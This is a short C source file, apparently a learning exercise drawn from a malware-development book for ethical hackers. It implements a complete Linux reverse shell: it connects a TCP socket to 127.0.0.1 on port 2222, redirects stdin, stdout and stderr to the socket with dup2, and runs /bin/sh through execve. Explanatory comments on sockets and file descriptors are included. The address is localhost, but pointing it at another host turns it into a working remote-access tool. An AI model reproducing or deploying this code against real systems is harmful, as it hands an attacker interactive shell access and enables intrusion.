#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <fcntl.h>



#define PORT 2222


int main() {

int sock;
char* client_ip = "127.0.0.1"; 
struct sockaddr_in target_address;


/*
socket() Parameters:

domain: Communication domain (e.g., AF_INET for IPv4, AF_INET6 for IPv6, AF_UNIX for UNIX domain sockets).

type: SOCK_STREAM (for TCP) or SOCK_DGRAM (for UDP).

protocol: Set to 0 to automatically choose the appropriate protocol.

*/
if ((sock = socket(AF_INET, SOCK_STREAM,0)) < 0) {
    perror("Socket creation failed.");
    exit(EXIT_FAILURE);
}

target_address.sin_family = AF_INET;
target_address.sin_port = htons(PORT);

// IP address string to binary:
if (inet_pton(AF_INET,client_ip,&target_address.sin_addr) <= 0) {
    perror("address to binary conversion failed.");
    exit(EXIT_FAILURE);
}

// Connect to the socket:
if (connect(sock,(struct sockaddr *)&target_address, sizeof(target_address)) < 0) {
    perror("Connection failed");
    exit(EXIT_FAILURE);
}


// https://www.baeldung.com/linux/c-dup2-redirect-stdout

// https://github.com/PacktPublishing/Malware-Development-for-Ethical-Hackers/blob/main/chapter01/02-reverse-shell-linux/hack2.c


for (int i =0; i < 3; i++) {

    /*
    FDs:
    standard input (STDIN): 0 (zero)
    standard output (STDOUT): 1 (one)
    standard error (STDERR): 2 (two)

    */
    dup2(sock,i);
} 

char * const argv[] = {"/bin/sh",NULL};
execve("/bin/sh",argv,NULL);

//close(sock);
return 0;





// get response from server.


}

